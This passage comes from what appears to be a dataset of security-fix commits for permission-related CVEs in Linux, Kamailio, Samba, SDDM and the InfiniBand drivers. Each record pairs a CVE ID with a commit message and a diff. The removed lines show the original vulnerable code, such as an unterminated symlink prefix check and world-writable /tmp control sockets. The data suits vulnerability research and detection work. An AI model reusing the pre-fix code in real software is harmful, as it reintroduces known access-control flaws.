AMD FXSAVE information leak workaround we\nneed to clear any pending exceptions, otherwise we trap with a\nfloating-point exception inside this code.\n\nReported-by: halfdog <me@halfdog.net>\nTested-by: Borislav Petkov <bp@suse.de>\nLink: http:\/\/lkml.kernel.org\/r\/CA%2B55aFxQnY_PCG_n4=0w-VG=YLXL-yr7oMxyy0WU2gCBAf3ydg@mail.gmail.com\nSigned-off-by: H. Peter Anvin <hpa@zytor.com>\n---\n arch\/x86\/include\/asm\/fpu-internal.h | 13 +++++++------\n 1 file changed, 7 insertions(+), 6 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/include\/asm\/fpu-internal.h b\/arch\/x86\/include\/asm\/fpu-internal.h\nindex c49a613c6452f..cea1c76d49bf5 100644\n--- a\/arch\/x86\/include\/asm\/fpu-internal.h\n+++ b\/arch\/x86\/include\/asm\/fpu-internal.h\n@@ -293,12 +293,13 @@ static inline int restore_fpu_checking(struct task_struct *tsk)\n \t\/* AMD K7\/K8 CPUs don't save\/restore FDP\/FIP\/FOP unless an exception\n \t   is pending.  Clear the x87 state here by setting it to fixed\n \t   values. \"m\" is a random variable that should be in L1 *\/\n-\talternative_input(\n-\t\tASM_NOP8 ASM_NOP2,\n-\t\t\"emms\\n\\t\"\t\t\/* clear stack tags *\/\n-\t\t\"fildl %P[addr]\",\t\/* set F?P to defined value *\/\n-\t\tX86_FEATURE_FXSAVE_LEAK,\n-\t\t[addr] \"m\" (tsk->thread.fpu.has_fpu));\n+\tif (unlikely(static_cpu_has(X86_FEATURE_FXSAVE_LEAK))) {\n+\t\tasm volatile(\n+\t\t\t\"fnclex\\n\\t\"\n+\t\t\t\"emms\\n\\t\"\n+\t\t\t\"fildl %P[addr]\"\t\/* set F?P to defined value *\/\n+\t\t\t: : [addr] \"m\" (tsk->thread.fpu.has_fpu));\n+\t}\n \n \treturn fpu_restore_checking(&tsk->thread.fpu);\n }\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-1590","CWE_ID":"264","category":"security","commit_id":"084e68b337f3afbc841347a6d27398bacfaf191b","commit_message":"From 084e68b337f3afbc841347a6d27398bacfaf191b Mon Sep 17 00:00:00 2001\nFrom: Victor Seva <linuxmaniac@torreviejawireless.org>\nDate: Tue, 17 Feb 2015 10:02:20 +0100\nSubject: [PATCH 1\/4] ctl: use RUN_DIR env to set DEFAULT_CTL_SOCKET\n\n---\n modules\/ctl\/ctl_defaults.h | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\nFrom 850320cac86e6c5cee6f8d936340678eb32412d3 Mon Sep 17 00:00:00 2001\nFrom: Victor Seva <linuxmaniac@torreviejawireless.org>\nDate: Tue, 17 Feb 2015 10:03:35 +0100\nSubject: [PATCH 2\/4] etc: set ctl \"binrpc\" to new \/var\/run\/kamailio default\n value\n\n---\n etc\/kamailio-basic.cfg | 2 ++\n etc\/kamailio-oob.cfg   | 2 ++\n etc\/kamailio.cfg       | 2 ++\n 3 files changed, 6 insertions(+)\n\nFrom be486988bc2e27ba44961f1c4d2af48cecf06da3 Mon Sep 17 00:00:00 2001\nFrom: Victor Seva <linuxmaniac@torreviejawireless.org>\nDate: Tue, 17 Feb 2015 10:07:06 +0100\nSubject: [PATCH 3\/4] utils\/kamctl: change fifo default path to\n \/var\/run\/kamailio\n\n---\n utils\/kamctl\/kamctl.fifo | 2 +-\n utils\/kamctl\/kamctlrc    | 4 ++--\n 2 files changed, 3 insertions(+), 3 deletions(-)\n\nFrom 6909de08ab5b51c90fe226b325a2492905d3fa40 Mon Sep 17 00:00:00 2001\nFrom: Victor Seva <linuxmaniac@torreviejawireless.org>\nDate: Tue, 17 Feb 2015 10:08:18 +0100\nSubject: [PATCH 4\/4] etc: change fifo default to \/var\/run\/kamailio\n\n---\n etc\/kamailio-basic.cfg | 2 +-\n etc\/kamailio-oob.cfg   | 2 +-\n etc\/kamailio.cfg       | 2 +-\n 3 files changed, 3 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/modules\/ctl\/ctl_defaults.h b\/modules\/ctl\/ctl_defaults.h\nindex 01b6680c3a..10498e39a5 100644\n--- a\/modules\/ctl\/ctl_defaults.h\n+++ b\/modules\/ctl\/ctl_defaults.h\n@@ -4,10 +4,10 @@\n \/*listen by default on: *\/\n #ifdef SRNAME\n \/* this is used when compiling sercmd tool *\/\n-#define DEFAULT_CTL_SOCKET  \"unixs:\/tmp\/\" SRNAME \"_ctl\"\n+#define DEFAULT_CTL_SOCKET  \"unixs:\" RUN_DIR \"\/\" SRNAME \"\/\" SRNAME \"_ctl\"\n #else\n \/* this is used when compiling sip server *\/\n-#define DEFAULT_CTL_SOCKET  \"unixs:\/tmp\/\" NAME \"_ctl\"\n+#define DEFAULT_CTL_SOCKET  \"unixs:\" RUN_DIR \"\/\" NAME \"_ctl\"\n #endif\n \/* port used by default for tcp\/udp if no port is explicitely specified *\/\n #define DEFAULT_CTL_PORT 2049\n\ndiff --git a\/etc\/kamailio-basic.cfg b\/etc\/kamailio-basic.cfg\nindex 17d7bcba59..4a978ff2de 100644\n--- a\/etc\/kamailio-basic.cfg\n+++ b\/etc\/kamailio-basic.cfg\n@@ -193,6 +193,8 @@ loadmodule \"debugger.so\"\n # ----- mi_fifo params -----\n modparam(\"mi_fifo\", \"fifo_name\", \"\/tmp\/kamailio_fifo\")\n \n+# ----- ctl params -----\n+modparam(\"ctl\", \"binrpc\", \"unix:\/var\/run\/kamailio\/kamailio_ctl\")\n \n # ----- tm params -----\n # auto-discard branches from previous serial forking leg\ndiff --git a\/etc\/kamailio-oob.cfg b\/etc\/kamailio-oob.cfg\nindex 6a16763db5..258b972e96 100644\n--- a\/etc\/kamailio-oob.cfg\n+++ b\/etc\/kamailio-oob.cfg\n@@ -317,6 +317,8 @@ loadmodule \"xhttp_pi.so\"\n # ----- mi_fifo params -----\n modparam(\"mi_fifo\", \"fifo_name\", \"\/tmp\/kamailio_fifo\")\n \n+# ----- ctl params -----\n+modparam(\"ctl\", \"binrpc\", \"unix:\/var\/run\/kamailio\/kamailio_ctl\")\n \n # ----- tm params -----\n # auto-discard branches from previous serial forking leg\ndiff --git a\/etc\/kamailio.cfg b\/etc\/kamailio.cfg\nindex 0644e6ae07..ca3dbb5bae 100644\n--- a\/etc\/kamailio.cfg\n+++ b\/etc\/kamailio.cfg\n@@ -290,6 +290,8 @@ loadmodule \"debugger.so\"\n # ----- mi_fifo params -----\n modparam(\"mi_fifo\", \"fifo_name\", \"\/tmp\/kamailio_fifo\")\n \n+# ----- ctl params -----\n+modparam(\"ctl\", \"binrpc\", \"unix:\/var\/run\/kamailio\/kamailio_ctl\")\n \n # ----- tm params -----\n # auto-discard branches from previous serial forking leg\n\ndiff --git a\/utils\/kamctl\/kamctl.fifo b\/utils\/kamctl\/kamctl.fifo\nindex e57c7df2de..c94a5cc724 100644\n--- a\/utils\/kamctl\/kamctl.fifo\n+++ b\/utils\/kamctl\/kamctl.fifo\n@@ -25,7 +25,7 @@ fi\n #\n if [ -z \"$FIFOPATH\" ]; then\n \tif [ -z \"$OSER_FIFO\" ]; then\n-\t\tFIFOPATH=\/tmp\/kamailio_fifo\n+\t\tFIFOPATH=\/var\/run\/kamailio\/kamailio_fifo\n \telse\n \t\tFIFOPATH=$OSER_FIFO\n \tfi\ndiff --git a\/utils\/kamctl\/kamctlrc b\/utils\/kamctl\/kamctlrc\nindex b8b241bdbc..f96cab6f12 100644\n--- a\/utils\/kamctl\/kamctlrc\n+++ b\/utils\/kamctl\/kamctlrc\n@@ -124,7 +124,7 @@\n # CTLENGINE=\"FIFO\"\n \n ## path to FIFO file\n-# FIFOPATH=\"\/tmp\/kamailio_fifo\"\n+# FIFOPATH=\"\/var\/run\/kamailio\/kamailio_fifo\"\n \n ## check ACL names; default on (1); off (0)\n # VERIFY_ACL=1\n@@ -142,7 +142,7 @@\n \n ## Kamailio START Options\n ## PID file path - default is: \/var\/run\/kamailio.pid\n-# PID_FILE=\/var\/run\/kamailio.pid\n+# PID_FILE=\/var\/run\/kamailio\/kamailio.pid\n \n ## Extra start options - default is: not set\n # example: start Kamailio with 64MB share memory: STARTOPTIONS=\"-m 64\"\n\ndiff --git a\/etc\/kamailio-basic.cfg b\/etc\/kamailio-basic.cfg\nindex 4a978ff2de..55685d57d0 100644\n--- a\/etc\/kamailio-basic.cfg\n+++ b\/etc\/kamailio-basic.cfg\n@@ -191,7 +191,7 @@ loadmodule \"debugger.so\"\n \n \n # ----- mi_fifo params -----\n-modparam(\"mi_fifo\", \"fifo_name\", \"\/tmp\/kamailio_fifo\")\n+modparam(\"mi_fifo\", \"fifo_name\", \"\/var\/run\/kamailio\/kamailio_fifo\")\n \n # ----- ctl params -----\n modparam(\"ctl\", \"binrpc\", \"unix:\/var\/run\/kamailio\/kamailio_ctl\")\ndiff --git a\/etc\/kamailio-oob.cfg b\/etc\/kamailio-oob.cfg\nindex 258b972e96..db786d0b03 100644\n--- a\/etc\/kamailio-oob.cfg\n+++ b\/etc\/kamailio-oob.cfg\n@@ -315,7 +315,7 @@ loadmodule \"xhttp_pi.so\"\n \n \n # ----- mi_fifo params -----\n-modparam(\"mi_fifo\", \"fifo_name\", \"\/tmp\/kamailio_fifo\")\n+modparam(\"mi_fifo\", \"fifo_name\", \"\/var\/run\/kamailio\/kamailio_fifo\")\n \n # ----- ctl params -----\n modparam(\"ctl\", \"binrpc\", \"unix:\/var\/run\/kamailio\/kamailio_ctl\")\ndiff --git a\/etc\/kamailio.cfg b\/etc\/kamailio.cfg\nindex ca3dbb5bae..78f6ee13ed 100644\n--- a\/etc\/kamailio.cfg\n+++ b\/etc\/kamailio.cfg\n@@ -288,7 +288,7 @@ loadmodule \"debugger.so\"\n \n \n # ----- mi_fifo params -----\n-modparam(\"mi_fifo\", \"fifo_name\", \"\/tmp\/kamailio_fifo\")\n+modparam(\"mi_fifo\", \"fifo_name\", \"\/var\/run\/kamailio\/kamailio_fifo\")\n \n # ----- ctl params -----\n modparam(\"ctl\", \"binrpc\", \"unix:\/var\/run\/kamailio\/kamailio_ctl\")\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2009-4131","CWE_ID":"264","category":"security","commit_id":"4a58579b9e4e2a35d57e6c9c8483e52f6f1b7fd6","commit_message":"From 4a58579b9e4e2a35d57e6c9c8483e52f6f1b7fd6 Mon Sep 17 00:00:00 2001\nFrom: Akira Fujita <a-fujita@rs.jp.nec.com>\nDate: Sun, 6 Dec 2009 23:38:31 -0500\nSubject: ext4: Fix insufficient checks in EXT4_IOC_MOVE_EXT\n\nThis patch fixes three problems in the handling of the\nEXT4_IOC_MOVE_EXT ioctl:\n\n1. In current EXT4_IOC_MOVE_EXT, there are read access mode checks for\noriginal and donor files, but they allow the illegal write access to\ndonor file, since donor file is overwritten by original file data.  To\nfix this problem, change access mode checks of original (r->r\/w) and\ndonor (r->w) files.\n\n2.  Disallow the use of donor files that have a setuid or setgid bits.\n\n3.  Call mnt_want_write() and mnt_drop_write() before and after\next4_move_extents() calling to get write access to a mount.\n\nSigned-off-by: Akira Fujita <a-fujita@rs.jp.nec.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\n---\n fs\/ext4\/ioctl.c       | 30 ++++++++++++++++++------------\n fs\/ext4\/move_extent.c |  7 +++++++\n 2 files changed, 25 insertions(+), 12 deletions(-)\n\n","diff_code":"diff --git a\/fs\/ext4\/ioctl.c b\/fs\/ext4\/ioctl.c\nindex 31e5ee0c858f..b63d193126db 100644\n--- a\/fs\/ext4\/ioctl.c\n+++ b\/fs\/ext4\/ioctl.c\n@@ -221,32 +221,38 @@ setversion_out:\n \t\tstruct file *donor_filp;\n \t\tint err;\n \n+\t\tif (!(filp->f_mode & FMODE_READ) ||\n+\t\t    !(filp->f_mode & FMODE_WRITE))\n+\t\t\treturn -EBADF;\n+\n \t\tif (copy_from_user(&me,\n \t\t\t(struct move_extent __user *)arg, sizeof(me)))\n \t\t\treturn -EFAULT;\n+\t\tme.moved_len = 0;\n \n \t\tdonor_filp = fget(me.donor_fd);\n \t\tif (!donor_filp)\n \t\t\treturn -EBADF;\n \n-\t\tif (!capable(CAP_DAC_OVERRIDE)) {\n-\t\t\tif ((current->real_cred->fsuid != inode->i_uid) ||\n-\t\t\t\t!(inode->i_mode & S_IRUSR) ||\n-\t\t\t\t!(donor_filp->f_dentry->d_inode->i_mode &\n-\t\t\t\tS_IRUSR)) {\n-\t\t\t\tfput(donor_filp);\n-\t\t\t\treturn -EACCES;\n-\t\t\t}\n+\t\tif (!(donor_filp->f_mode & FMODE_WRITE)) {\n+\t\t\terr = -EBADF;\n+\t\t\tgoto mext_out;\n \t\t}\n \n-\t\tme.moved_len = 0;\n+\t\terr = mnt_want_write(filp->f_path.mnt);\n+\t\tif (err)\n+\t\t\tgoto mext_out;\n+\n \t\terr = ext4_move_extents(filp, donor_filp, me.orig_start,\n \t\t\t\t\tme.donor_start, me.len, &me.moved_len);\n-\t\tfput(donor_filp);\n+\t\tmnt_drop_write(filp->f_path.mnt);\n+\t\tif (me.moved_len > 0)\n+\t\t\tfile_remove_suid(donor_filp);\n \n \t\tif (copy_to_user((struct move_extent *)arg, &me, sizeof(me)))\n-\t\t\treturn -EFAULT;\n-\n+\t\t\terr = -EFAULT;\n+mext_out:\n+\t\tfput(donor_filp);\n \t\treturn err;\n \t}\n \ndiff --git a\/fs\/ext4\/move_extent.c b\/fs\/ext4\/move_extent.c\nindex cad1e2edda7e..82c415be87a4 100644\n--- a\/fs\/ext4\/move_extent.c\n+++ b\/fs\/ext4\/move_extent.c\n@@ -957,6 +957,13 @@ mext_check_arguments(struct inode *orig_inode,\n \t\treturn -EINVAL;\n \t}\n \n+\tif (donor_inode->i_mode & (S_ISUID|S_ISGID)) {\n+\t\text4_debug(\"ext4 move extent: suid or sgid is set\"\n+\t\t\t   \" to donor file [ino:orig %lu, donor %lu]\\n\",\n+\t\t\t   orig_inode->i_ino, donor_inode->i_ino);\n+\t\treturn -EINVAL;\n+\t}\n+\n \t\/* Ext4 move extent does not support swapfile *\/\n \tif (IS_SWAPFILE(orig_inode) || IS_SWAPFILE(donor_inode)) {\n \t\text4_debug(\"ext4 move extent: The argument files should \"\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-5252","CWE_ID":"264","category":"security","commit_id":"4278ef25f64d5fdbf432ff1534e275416ec9561e","commit_message":"From 4278ef25f64d5fdbf432ff1534e275416ec9561e Mon Sep 17 00:00:00 2001\nFrom: Jeremy Allison <jra@samba.org>\nDate: Thu, 9 Jul 2015 10:58:11 -0700\nSubject: [PATCH] CVE-2015-5252: s3: smbd: Fix symlink verification (file\n access outside the share).\n\nEnsure matching component ends in '\/' or '\\0'.\n\nBUG: https:\/\/bugzilla.samba.org\/show_bug.cgi?id=11395\n\nSigned-off-by: Jeremy Allison <jra@samba.org>\nReviewed-by: Volker Lendecke <vl@samba.org>\n---\n source3\/smbd\/vfs.c | 13 ++++++++++---\n 1 file changed, 10 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/source3\/smbd\/vfs.c b\/source3\/smbd\/vfs.c\nindex 9f3ba6dd905..f14ecbef966 100644\n--- a\/source3\/smbd\/vfs.c\n+++ b\/source3\/smbd\/vfs.c\n@@ -982,6 +982,7 @@ NTSTATUS check_reduced_name_with_privilege(connection_struct *conn,\n \tstruct smb_filename *smb_fname_cwd = NULL;\n \tstruct privilege_paths *priv_paths = NULL;\n \tint ret;\n+\tbool matched;\n \n \tDEBUG(3,(\"check_reduced_name_with_privilege [%s] [%s]\\n\",\n \t\t\tfname,\n@@ -1076,7 +1077,10 @@ NTSTATUS check_reduced_name_with_privilege(connection_struct *conn,\n \t}\n \n \trootdir_len = strlen(conn_rootdir);\n-\tif (strncmp(conn_rootdir, resolved_name, rootdir_len) != 0) {\n+\tmatched = (strncmp(conn_rootdir, resolved_name, rootdir_len) == 0);\n+\n+\tif (!matched || (resolved_name[rootdir_len] != '\/' &&\n+\t\t\t resolved_name[rootdir_len] != '\\0')) {\n \t\tDEBUG(2, (\"check_reduced_name_with_privilege: Bad access \"\n \t\t\t\"attempt: %s is a symlink outside the \"\n \t\t\t\"share path\\n\",\n@@ -1216,6 +1220,7 @@ NTSTATUS check_reduced_name(connection_struct *conn, const char *fname)\n \tif (!allow_widelinks || !allow_symlinks) {\n \t\tconst char *conn_rootdir;\n \t\tsize_t rootdir_len;\n+\t\tbool matched;\n \n \t\tconn_rootdir = SMB_VFS_CONNECTPATH(conn, fname);\n \t\tif (conn_rootdir == NULL) {\n@@ -1226,8 +1231,10 @@ NTSTATUS check_reduced_name(connection_struct *conn, const char *fname)\n \t\t}\n \n \t\trootdir_len = strlen(conn_rootdir);\n-\t\tif (strncmp(conn_rootdir, resolved_name,\n-\t\t\t\trootdir_len) != 0) {\n+\t\tmatched = (strncmp(conn_rootdir, resolved_name,\n+\t\t\t\trootdir_len) == 0);\n+\t\tif (!matched || (resolved_name[rootdir_len] != '\/' &&\n+\t\t\t\t resolved_name[rootdir_len] != '\\0')) {\n \t\t\tDEBUG(2, (\"check_reduced_name: Bad access \"\n \t\t\t\t\"attempt: %s is a symlink outside the \"\n \t\t\t\t\"share path\\n\", fname));\n-- \n2.17.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-9004","CWE_ID":"264","category":"security","commit_id":"c3c87e770458aa004bd7ed3f29945ff436fd6511","commit_message":"From c3c87e770458aa004bd7ed3f29945ff436fd6511 Mon Sep 17 00:00:00 2001\nFrom: Peter Zijlstra <peterz@infradead.org>\nDate: Fri, 23 Jan 2015 11:19:48 +0100\nSubject: [PATCH] perf: Tighten (and fix) the grouping condition\n\nThe fix from 9fc81d87420d (\"perf: Fix events installation during\nmoving group\") was incomplete in that it failed to recognise that\ncreating a group with events for different CPUs is semantically\nbroken -- they cannot be co-scheduled.\n\nFurthermore, it leads to real breakage where, when we create an event\nfor CPU Y and then migrate it to form a group on CPU X, the code gets\nconfused where the counter is programmed -- triggered in practice\nas well by me via the perf fuzzer.\n\nFix this by tightening the rules for creating groups. Only allow\ngrouping of counters that can be co-scheduled in the same context.\nThis means for the same task and\/or the same cpu.\n\nFixes: 9fc81d87420d (\"perf: Fix events installation during moving group\")\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>\nCc: Arnaldo Carvalho de Melo <acme@kernel.org>\nCc: Jiri Olsa <jolsa@redhat.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nLink: http:\/\/lkml.kernel.org\/r\/20150123125834.090683288@infradead.org\nSigned-off-by: Ingo Molnar <mingo@kernel.org>\n---\n include\/linux\/perf_event.h |  6 ------\n kernel\/events\/core.c       | 15 +++++++++++++--\n 2 files changed, 13 insertions(+), 8 deletions(-)\n\n","diff_code":"diff --git a\/include\/linux\/perf_event.h b\/include\/linux\/perf_event.h\nindex 4f7a61ca4b393..664de5a4ec467 100644\n--- a\/include\/linux\/perf_event.h\n+++ b\/include\/linux\/perf_event.h\n@@ -450,11 +450,6 @@ struct perf_event {\n #endif \/* CONFIG_PERF_EVENTS *\/\n };\n \n-enum perf_event_context_type {\n-\ttask_context,\n-\tcpu_context,\n-};\n-\n \/**\n  * struct perf_event_context - event context structure\n  *\n@@ -462,7 +457,6 @@ enum perf_event_context_type {\n  *\/\n struct perf_event_context {\n \tstruct pmu\t\t\t*pmu;\n-\tenum perf_event_context_type\ttype;\n \t\/*\n \t * Protect the states of the events in the list,\n \t * nr_active, and the list:\ndiff --git a\/kernel\/events\/core.c b\/kernel\/events\/core.c\nindex 882f835a0d859..19efcf13375a2 100644\n--- a\/kernel\/events\/core.c\n+++ b\/kernel\/events\/core.c\n@@ -6776,7 +6776,6 @@ int perf_pmu_register(struct pmu *pmu, const char *name, int type)\n \t\t__perf_event_init_context(&cpuctx->ctx);\n \t\tlockdep_set_class(&cpuctx->ctx.mutex, &cpuctx_mutex);\n \t\tlockdep_set_class(&cpuctx->ctx.lock, &cpuctx_lock);\n-\t\tcpuctx->ctx.type = cpu_context;\n \t\tcpuctx->ctx.pmu = pmu;\n \n \t\t__perf_cpu_hrtimer_init(cpuctx, cpu);\n@@ -7420,7 +7419,19 @@ SYSCALL_DEFINE5(perf_event_open,\n \t\t * task or CPU context:\n \t\t *\/\n \t\tif (move_group) {\n-\t\t\tif (group_leader->ctx->type != ctx->type)\n+\t\t\t\/*\n+\t\t\t * Make sure we're both on the same task, or both\n+\t\t\t * per-cpu events.\n+\t\t\t *\/\n+\t\t\tif (group_leader->ctx->task != ctx->task)\n+\t\t\t\tgoto err_context;\n+\n+\t\t\t\/*\n+\t\t\t * Make sure we're both events for the same CPU;\n+\t\t\t * grouping events for different CPUs is broken; since\n+\t\t\t * you can never concurrently schedule them anyhow.\n+\t\t\t *\/\n+\t\t\tif (group_leader->cpu != event->cpu)\n \t\t\t\tgoto err_context;\n \t\t} else {\n \t\t\tif (group_leader->ctx != ctx)\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-0856","CWE_ID":"264","category":"security","commit_id":"4cfed6b0a625593fb43876f04badc4dd99799d86","commit_message":"From 4cfed6b0a625593fb43876f04badc4dd99799d86 Mon Sep 17 00:00:00 2001\nFrom: David Edmundson <kde@davidedmundson.co.uk>\nDate: Wed, 14 Oct 2015 00:08:59 +0100\nSubject: [PATCH] Disable greeters from loading KDE's debug hander\n\nSome themes may use KDE components which will automatically load KDE's\ncrash handler.\n\nIf the greeter were to then somehow crash, that would leave a crash\nhandler allowing other actions, albeit as the locked down SDDM user.\n\nOnly SDDM users using the breeze theme from plasma-workspace are\naffected. Safest and simplest fix is to handle this inside SDDM\ndisabling kcrash via an environment variable for all future themes that\nmay use these libraries.\n\nCVE-2015-0856\n---\n src\/daemon\/Greeter.cpp | 4 ++++\n 1 file changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/src\/daemon\/Greeter.cpp b\/src\/daemon\/Greeter.cpp\nindex 68c4dc38..8c936b7d 100644\n--- a\/src\/daemon\/Greeter.cpp\n+++ b\/src\/daemon\/Greeter.cpp\n@@ -145,6 +145,10 @@ namespace SDDM {\n             env.insert(QStringLiteral(\"XDG_VTNR\"), QString::number(m_display->terminalId()));\n             env.insert(QStringLiteral(\"XDG_SESSION_CLASS\"), QStringLiteral(\"greeter\"));\n             env.insert(QStringLiteral(\"XDG_SESSION_TYPE\"), m_display->sessionType());\n+\n+            \/\/some themes may use KDE components and that will automatically load KDE's crash handler which we don't want\n+            \/\/counterintuitively setting this env disables that handler\n+            env.insert(QStringLiteral(\"KDE_DEBUG\"), QStringLiteral(\"1\"));\n             m_auth->insertEnvironment(env);\n \n             \/\/ log message\n","owner":"sddm","repo":"sddm","source":"cve"},{"CVE_ID":"CVE-2016-4565","CWE_ID":"264","category":"security","commit_id":"e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3","commit_message":"From e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3 Mon Sep 17 00:00:00 2001\nFrom: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>\nDate: Sun, 10 Apr 2016 19:13:13 -0600\nSubject: IB\/security: Restrict use of the write() interface\n\nThe drivers\/infiniband stack uses write() as a replacement for\nbi-directional ioctl().  This is not safe. There are ways to\ntrigger write calls that result in the return structure that\nis normally written to user space being shunted off to user\nspecified kernel memory instead.\n\nFor the immediate repair, detect and deny suspicious accesses to\nthe write API.\n\nFor long term, update the user space libraries and the kernel API\nto something that doesn't present the same security vulnerabilities\n(likely a structured ioctl() interface).\n\nThe impacted uAPI interfaces are generally only available if\nhardware from drivers\/infiniband is installed in the system.\n\nReported-by: Jann Horn <jann@thejh.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>\n[ Expanded check to all known write() entry points ]\nCc: stable@vger.kernel.org\nSigned-off-by: Doug Ledford <dledford@redhat.com>\n---\n drivers\/infiniband\/core\/ucm.c            |  4 ++++\n drivers\/infiniband\/core\/ucma.c           |  3 +++\n drivers\/infiniband\/core\/uverbs_main.c    |  5 +++++\n drivers\/infiniband\/hw\/qib\/qib_file_ops.c |  5 +++++\n drivers\/staging\/rdma\/hfi1\/TODO           |  2 +-\n drivers\/staging\/rdma\/hfi1\/file_ops.c     |  6 ++++++\n include\/rdma\/ib.h                        | 16 ++++++++++++++++\n 7 files changed, 40 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/infiniband\/core\/ucm.c b\/drivers\/infiniband\/core\/ucm.c\nindex 4a9aa0433b07..7713ef089c3c 100644\n--- a\/drivers\/infiniband\/core\/ucm.c\n+++ b\/drivers\/infiniband\/core\/ucm.c\n@@ -48,6 +48,7 @@\n \n #include <asm\/uaccess.h>\n \n+#include <rdma\/ib.h>\n #include <rdma\/ib_cm.h>\n #include <rdma\/ib_user_cm.h>\n #include <rdma\/ib_marshall.h>\n@@ -1103,6 +1104,9 @@ static ssize_t ib_ucm_write(struct file *filp, const char __user *buf,\n \tstruct ib_ucm_cmd_hdr hdr;\n \tssize_t result;\n \n+\tif (WARN_ON_ONCE(!ib_safe_file_access(filp)))\n+\t\treturn -EACCES;\n+\n \tif (len < sizeof(hdr))\n \t\treturn -EINVAL;\n \ndiff --git a\/drivers\/infiniband\/core\/ucma.c b\/drivers\/infiniband\/core\/ucma.c\nindex dd3bcceadfde..c0f3826abb30 100644\n--- a\/drivers\/infiniband\/core\/ucma.c\n+++ b\/drivers\/infiniband\/core\/ucma.c\n@@ -1574,6 +1574,9 @@ static ssize_t ucma_write(struct file *filp, const char __user *buf,\n \tstruct rdma_ucm_cmd_hdr hdr;\n \tssize_t ret;\n \n+\tif (WARN_ON_ONCE(!ib_safe_file_access(filp)))\n+\t\treturn -EACCES;\n+\n \tif (len < sizeof(hdr))\n \t\treturn -EINVAL;\n \ndiff --git a\/drivers\/infiniband\/core\/uverbs_main.c b\/drivers\/infiniband\/core\/uverbs_main.c\nindex 28ba2cc81535..31f422a70623 100644\n--- a\/drivers\/infiniband\/core\/uverbs_main.c\n+++ b\/drivers\/infiniband\/core\/uverbs_main.c\n@@ -48,6 +48,8 @@\n \n #include <asm\/uaccess.h>\n \n+#include <rdma\/ib.h>\n+\n #include \"uverbs.h\"\n \n MODULE_AUTHOR(\"Roland Dreier\");\n@@ -709,6 +711,9 @@ static ssize_t ib_uverbs_write(struct file *filp, const char __user *buf,\n \tint srcu_key;\n \tssize_t ret;\n \n+\tif (WARN_ON_ONCE(!ib_safe_file_access(filp)))\n+\t\treturn -EACCES;\n+\n \tif (count < sizeof hdr)\n \t\treturn -EINVAL;\n \ndiff --git a\/drivers\/infiniband\/hw\/qib\/qib_file_ops.c b\/drivers\/infiniband\/hw\/qib\/qib_file_ops.c\nindex e449e394963f..24f4a782e0f4 100644\n--- a\/drivers\/infiniband\/hw\/qib\/qib_file_ops.c\n+++ b\/drivers\/infiniband\/hw\/qib\/qib_file_ops.c\n@@ -45,6 +45,8 @@\n #include <linux\/export.h>\n #include <linux\/uio.h>\n \n+#include <rdma\/ib.h>\n+\n #include \"qib.h\"\n #include \"qib_common.h\"\n #include \"qib_user_sdma.h\"\n@@ -2067,6 +2069,9 @@ static ssize_t qib_write(struct file *fp, const char __user *data,\n \tssize_t ret = 0;\n \tvoid *dest;\n \n+\tif (WARN_ON_ONCE(!ib_safe_file_access(fp)))\n+\t\treturn -EACCES;\n+\n \tif (count < sizeof(cmd.type)) {\n \t\tret = -EINVAL;\n \t\tgoto bail;\ndiff --git a\/drivers\/staging\/rdma\/hfi1\/TODO b\/drivers\/staging\/rdma\/hfi1\/TODO\nindex 05de0dad8762..4c6f1d7d2eaf 100644\n--- a\/drivers\/staging\/rdma\/hfi1\/TODO\n+++ b\/drivers\/staging\/rdma\/hfi1\/TODO\n@@ -3,4 +3,4 @@ July, 2015\n - Remove unneeded file entries in sysfs\n - Remove software processing of IB protocol and place in library for use\n   by qib, ipath (if still present), hfi1, and eventually soft-roce\n-\n+- Replace incorrect uAPI\ndiff --git a\/drivers\/staging\/rdma\/hfi1\/file_ops.c b\/drivers\/staging\/rdma\/hfi1\/file_ops.c\nindex 541529589736..c1c5bf82addb 100644\n--- a\/drivers\/staging\/rdma\/hfi1\/file_ops.c\n+++ b\/drivers\/staging\/rdma\/hfi1\/file_ops.c\n@@ -49,6 +49,8 @@\n #include <linux\/vmalloc.h>\n #include <linux\/io.h>\n \n+#include <rdma\/ib.h>\n+\n #include \"hfi.h\"\n #include \"pio.h\"\n #include \"device.h\"\n@@ -190,6 +192,10 @@ static ssize_t hfi1_file_write(struct file *fp, const char __user *data,\n \tint uctxt_required = 1;\n \tint must_be_root = 0;\n \n+\t\/* FIXME: This interface cannot continue out of staging *\/\n+\tif (WARN_ON_ONCE(!ib_safe_file_access(fp)))\n+\t\treturn -EACCES;\n+\n \tif (count < sizeof(cmd)) {\n \t\tret = -EINVAL;\n \t\tgoto bail;\ndiff --git a\/include\/rdma\/ib.h b\/include\/rdma\/ib.h\nindex cf8f9e700e48..a6b93706b0fc 100644\n--- a\/include\/rdma\/ib.h\n+++ b\/include\/rdma\/ib.h\n@@ -34,6 +34,7 @@\n #define _RDMA_IB_H\n \n #include <linux\/types.h>\n+#include <linux\/sched.h>\n \n struct ib_addr {\n \tunion {\n@@ -86,4 +87,19 @@ struct sockaddr_ib {\n \t__u64\t\t\tsib_scope_id;\n };\n \n+\/*\n+ * The IB interfaces that use write() as bi-directional ioctl() are\n+ * fundamentally unsafe, since there are lots of ways to trigger \"write()\"\n+ * calls from various contexts with elevated privileges. That includes the\n+ * traditional suid executable error message 